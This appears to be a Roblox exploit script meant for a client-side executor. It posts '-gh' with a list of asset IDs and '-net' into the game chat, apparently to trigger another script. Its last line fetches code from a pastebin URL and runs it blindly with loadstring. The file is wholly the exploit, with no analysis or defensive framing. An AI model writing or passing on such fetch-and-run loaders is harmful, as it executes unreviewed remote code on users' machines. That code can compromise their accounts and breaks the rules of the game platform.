local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local function SendChatMessage(message)
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local textChannels = TextChatService:FindFirstChild("TextChannels")
        if textChannels then
            local rbxSystem = textChannels:FindFirstChild("RBXSystem")
            if rbxSystem then
                rbxSystem:SendAsync(message)
                return
            end
            local rbxGeneral = textChannels:FindFirstChild("RBXGeneral")
            if rbxGeneral then
                rbxGeneral:SendAsync(message)
                return
            end
        end
        warn("No suitable text channel found!")
    else
        local sayMessageRequest = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
        if sayMessageRequest then
            sayMessageRequest:FireServer(message, "All")
        else
            local player = Players.LocalPlayer
            if player and player:FindFirstChild("Chat") then
                player:Chat(message)
            else
                warn("Legacy chat system not found!")
            end
        end
    end
end

local customMessage = "-gh 63690008 62234425 48474313 62724852 451220849 48474294 12103270510 12103236257 9350274205 15166105445 16775414552"
local netMessage = "-net"

SendChatMessage(customMessage)
SendChatMessage(netMessage)

task.wait(0.2)

loadstring(game:HttpGet('https://pastebin.com/raw/bQRebUUj'))()